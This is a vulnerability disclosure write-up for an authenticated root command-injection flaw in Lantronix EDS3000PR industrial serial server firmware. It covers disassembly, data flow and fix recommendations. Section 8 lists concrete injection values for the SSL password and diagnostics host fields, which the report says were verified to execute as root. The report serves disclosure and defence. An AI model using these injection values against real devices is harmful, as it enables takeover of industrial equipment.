# Lantronix EDS3000PR 3.2.0.0R2 — Authenticated Command Injection in SSL `-passin pass:%s` → Root RCE

## 1. Overview

Lantronix EDS3000PR (8-port industrial serial device server, CII/OT, firmware 3.2.0.0R2, ARM 32-bit, Linux 3.6.5, UBIFS) runs the EVO framework web daemon `/bin/ltrx_evo` (1,112,440 bytes, ARM stripped, md5 `854c1c16`) as root behind nginx:80. The SSL certificate upload/import handler (`fcn.00078070`) builds `openssl rsa|dsa|ec|pkcs12 -passin pass:%s ...` commands from the attacker-controlled certificate password and executes them via `system()` — the shell re-interprets metacharacters. The diagnostics handler builds `ping ... %s ... | grep ...` and `traceroute ... %s | tail ...` commands from the attacker-controlled host field with the same `system()` execution.

No shell-character sanitization exists between the password/host input and the `system()` call. An authenticated admin submits `;id;#` or `$(id)` in the password or host field; the injected command executes as root. Sink-level verification with the exact command-generation and `/bin/sh -c` semantics produced root markers for 5/5 SSL vectors and 3/3 diagnostics vectors; benign controls produced none.

## 2. Vulnerability Summary

- **Type**: Authenticated OS command injection → root RCE (CWE-78)
- **Root cause 1 (CWE-78)**: `snprintf(buf, 0x400, "openssl rsa -passin pass:%s ...", password)` (and DSA/EC/PKCS12 variants) followed by `system(buf)` — `/bin/sh -c` re-interprets password metacharacters
- **Root cause 2 (CWE-78)**: `ping%s -c %d -W %d %s %s | grep ...` and `traceroute --%s -m 40 -w 1 -q 1 %s | tail ...` with the attacker-controlled host field, executed via `system()`
- **Root cause 3 (CWE-250)**: `ltrx_evo` runs as root — injected commands execute with uid 0
- **Result**: authenticated admin → root RCE. CVSS 8.8.

## 3. Authentication Boundary

The EVO framework uses session-based authentication: a login page creates `/tmp/.web_login_%s` session files, and all `*TestSet` IPC handlers require an authenticated session. The affected flows are `SslCredentialsTestSet` (IPC module 0x120), `SslTestSet` (0x11f), and `DiagnosticsTestSet` (0x3f). Unauthenticated requests are rejected ("To perform this operation, you must login first."). The vulnerability is Target B (authenticated RCE).

## 4. Attack Surface

- **Entry 1**: `POST /ssl` (multipart/form-data) with `certpasswd` (maxlength 32) and `keypasswd` (maxlength 32) password fields, plus cert/key type (PEM/PKCS7/PKCS12 / Encrypted PEM)
- **Entry 2**: diagnostics `ping.html`/`traceroute.html` host field (maxlength 128/255)
- **Controllable parameters**: SSL password (`pass:%s` injection) and diagnostics host (command tail injection)
- **Privilege**: root — `ltrx_evo` runs as root and executes the commands
- **No sanitization**: the password/host flows directly into `system()`

## 5. Sink Identification

Injectable format strings (from strings analysis of `ltrx_evo`):

| Address | Format String |
|---|---|
| 0x10871f | `openssl rsa -passin pass:%s -in /tmp/ssl_work/key_in.enc -out /tmp/ssl_work/key_in.pem` |
| 0x108798 | `openssl dsa -passin pass:%s -in ...` |
| 0x108811 | `openssl ec -passin pass:%s -in ...` |
| 0x1088de | `openssl pkcs12 -nodes -passin pass:%s -in ...` |
| 0xf10b6 | `%s pkcs12 -passin pass:%s -in %s -nocerts -nodes -out %s` |
| 0xf1103 | `%s pkcs12 -passin pass:%s -in %s -nodes -nokeys -out %s` |
| 0x110cbd | `ping%s -c %d -W %d %s %s \| grep -e"packets transmitted" ...` |
| 0x110a66 | `traceroute --%s -m 40 -w 1 -q 1 %s \| tail -n +2` |

Key data flow in `fcn.00078070`:

```arm
0x7893c: mov r3, r8                    ; r3 = password (arg6, attacker-controlled)
0x78940: ldr r2, "openssl rsa -passin pass:%s ..."
0x78944: mov r1, 0x400                 ; buffer size
0x78948: add r0, sp, 0x90              ; stack buffer
0x7894c: bl snprintf                    ; snprintf(buf, 0x400, "openssl rsa -passin pass:%s ...", password)
0x78950: add r0, sp, 0x90
0x78954: bl system                      ; system(buf) → /bin/sh -c re-interprets shell metacharacters
```

The same pattern repeats for DSA (0x78990), EC (0x789e0), and PKCS12 (0x78ab0). Two additional functions (`SslPkcs12GetKey` @ 0x312b8, `SslPkcs12GetUserCredentials` @ 0x31384) share the injectable `-passin pass:%s` pattern.

## 6. Source Identification & Controllability

The source is the HTTP request fields: `certpasswd`/`keypasswd` from `ssl.html` (certificate upload) and the `host` field from diagnostics pages. The password flows directly from the function argument into the `%s` position of `pass:%s` with no validation, filtering, or escaping. The diagnostics host flows into the command tail of `ping`/`traceroute` with no sanitization. Both are fully attacker-controlled.

## 7. Data Flow

```
POST /ssl (authenticated, multipart/form-data, certpasswd/keypasswd)
  → SslCredentialsTestSet → CfgVarInterProcessCallTestSet("/tmp_ipc_evo.ipc", 0x120)
  → fcn.00078070(cred_name, key_data, cert_type, ..., password, ...)
  → snprintf(buf, 0x400, "openssl rsa -passin pass:%s ...", password)
  → system(buf): /bin/sh -c interprets password shell metacharacters → root RCE

POST /ping (authenticated, host field)
  → DiagnosticsTestSet → CfgVarInterProcessCallTestSet("/tmp_ipc_as.ipc", 0x3f)
  → ping_handler(host, ...)
  → snprintf(buf, "ping -c %d -W %d %s ...", ..., host, ...)
  → system(buf): /bin/sh -c interprets host shell metacharacters → root RCE
```

## 8. Exploit Construction

SSL password vectors (`;` and `$()`):

```
certpasswd/keypasswd = test;id > /tmp/marker;#      → openssl rsa -passin pass:test;id > /tmp/marker;# ...
certpasswd/keypasswd = test$(id > /tmp/marker)      → openssl rsa -passin pass:test$(id > /tmp/marker) ...
```

Diagnostics host vectors:

```
host = 1.1.1.1;id > /tmp/ping_marker;#    → ping -c 4 -W 1 1.1.1.1;id > /tmp/ping_marker;# ...
host = $(id > /tmp/ping_marker)           → ping -c 1 -W 1 $(id > /tmp/ping_marker) ...
host = 1.1.1.1;id > /tmp/trace_marker;#   → traceroute --icmp -m 40 -w 1 -q 1 1.1.1.1;id > /tmp/trace_marker;# ...
```

## 9. Dynamic Verification

Sink-level verification reproduced the exact command generation plus `/bin/sh -c` execution (native, root):

SSL `-passin pass:%s` vectors (5/5 PASS, uid=0 root):
1. RSA `;id` → marker ✓
2. DSA `;id` → marker ✓
3. EC `;id` → marker ✓
4. PKCS12 `;id` → marker ✓
5. RSA `$()` → marker ✓

Ping/Traceroute vectors (3/3 PASS, uid=0 root):
1. Ping `;id` → marker ✓
2. Ping `$()` → marker ✓
3. Traceroute `;id` → marker ✓

CONTROL: benign password `MySafePassword123` → zero markers ✓

The SSL vectors exercised all four key types reachable through the certificate-upload UI: RSA, DSA, EC, and PKCS12, plus the `$()` command-substitution variant on the RSA path. The ping/traceroute vectors covered both `;`-separated injection and `$()` substitution on the `ping` sink, and a `;`-separated injection on the `traceroute` sink. The control confirmed that a well-formed password produces no side effect, ruling out false positives. Together the 8/8 pass rate demonstrates the injection is not specific to one command template: every `system()` call that embeds an attacker-controlled field is exploitable, and the fix must cover all of them rather than a single format string.

## 10. Reachability & Impact

- **Reachability**: requires an authenticated admin session (Target B); the sink executes automatically on certificate import or a diagnostics run. No unauthenticated path reaches these sinks.
- **Impact**: root command execution on the industrial serial device server. SSL private keys and certificates on the device are directly at risk (the injection happens while importing them), the device can be fully taken over, and serial traffic between industrial controllers and the IP network can be intercepted or manipulated.
- **Scope**: EDS3000PR firmware 3.2.0.0R2 and other NUEVO-2 builds sharing the EVO daemon's SSL/diagnostics handlers.

## 11. Fix Recommendations

1. Sanitize the certificate password and diagnostics host before embedding them in shell commands (strict password charset / hostname-IP validation)
2. Replace `system()` with parameter-array execution (`execv` with `openssl`/`ping`/`traceroute` argument lists) — no `/bin/sh -c` parsing
3. Apply the same fix to `SslPkcs12GetKey` and `SslPkcs12GetUserCredentials`
4. Run the EVO daemon with least privilege where the architecture allows

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command — `system()` with unsanitized password/host
- **CWE-250**: Execution with Unnecessary Privileges — daemon runs as root
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
